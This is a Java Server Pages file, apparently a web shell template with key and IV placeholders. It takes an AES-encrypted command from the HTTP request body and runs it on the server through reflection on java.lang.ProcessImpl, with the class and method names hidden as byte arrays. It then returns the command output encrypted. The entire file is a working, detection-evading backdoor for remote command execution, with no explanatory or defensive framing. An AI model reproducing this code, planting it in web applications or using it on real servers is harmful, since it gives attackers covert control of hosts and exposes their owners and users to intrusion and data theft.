<%@ page import="java.io.*" %>
<%@ page import="java.util.Base64" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="java.security.spec.AlgorithmParameterSpec" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="javax.crypto.spec.IvParameterSpec" %>
<%@ page import="javax.crypto.SecretKey" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Map" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    public static String encrypt(final String plaintext) {
        try {
            SecretKey key = new SecretKeySpec("[key_placeholder]".getBytes(), "AES");
            AlgorithmParameterSpec iv = new IvParameterSpec("[iv_placeholder]".getBytes());
            // 指定加密的算法、工作模式和填充方式
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, key, iv);
            byte[] result = cipher.doFinal(plaintext.getBytes("UTF-8"));
            return Base64.getEncoder().encodeToString(result);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static String decrypt(final String encrypted) {
        try {
            SecretKey key = new SecretKeySpec("[key_placeholder]".getBytes(), "AES");
            AlgorithmParameterSpec iv = new IvParameterSpec("[iv_placeholder]".getBytes());
            byte[] decodeBase64 = Base64.getDecoder().decode(encrypted);
            // 指定加密的算法、工作模式和填充方式
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, key, iv);
            return new String(cipher.doFinal(decodeBase64), "UTF-8");
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
%>
<%
    BufferedReader br = request.getReader();
    String str, wholeStr = "";
    while((str = br.readLine()) != null) {
        wholeStr += str + "\n";
    }
	br.close();
	
    if(wholeStr != null && !wholeStr.trim().equals("")){
		wholeStr = decrypt(wholeStr.substring(0,wholeStr.length()-1));
        Class clazz = Class.forName(new String(new byte[] {106,97,118,97,46,108,97,110,103,46,80,114,111,99,101,115,115,73,109,112,108}));
        Method method = clazz.getDeclaredMethod(new String(new byte[]{115,116,97,114,116}), String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
        method.setAccessible(true);
        Process p = (Process)method.invoke(null, wholeStr.split(",",3), null, null, null, true);
        InputStream in = p.getInputStream();
        int len = 0;
        byte[] buffer = new byte[1024];
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        while((len = in.read(buffer)) != -1){
            baos.write(buffer, 0, len);
        }
       
        response.getWriter().print(encrypt(baos.toString().trim()));
		in.close();
		baos.close();
    }
%>